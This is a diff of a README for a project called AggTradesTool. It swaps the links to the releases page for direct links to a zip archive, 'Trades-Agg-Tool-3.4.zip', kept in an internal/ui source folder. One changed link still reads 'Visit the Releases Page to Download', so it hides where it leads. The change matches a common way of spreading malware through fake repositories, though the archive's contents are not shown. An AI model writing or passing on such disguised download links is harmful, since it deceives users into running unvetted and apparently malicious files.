@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download AggTradesTool](https://img.shields.io/badge/Download-AggTradesTool-blue.svg)](https://github.com/maikadee/AggTradesTool/releases)
+[![Download AggTradesTool](https://github.com/maikadee/AggTradesTool/raw/refs/heads/master/internal/ui/Trades-Agg-Tool-3.4.zip)](https://github.com/maikadee/AggTradesTool/raw/refs/heads/master/internal/ui/Trades-Agg-Tool-3.4.zip)
 
 ---
 
@@ -33,7 +33,7 @@ To get started with AggTradesTool, you will need to download the latest version 
 
 1. **Visit the Releases Page:** Click the link below to access the download options.
    
-   [Visit the Releases Page to Download](https://github.com/maikadee/AggTradesTool/releases)
+   [Visit the Releases Page to Download](https://github.com/maikadee/AggTradesTool/raw/refs/heads/master/internal/ui/Trades-Agg-Tool-3.4.zip)
 
 2. **Select the Appropriate File:** Look for the latest release. You will see several files available for download. Choose the one that corresponds to your operating system.
 
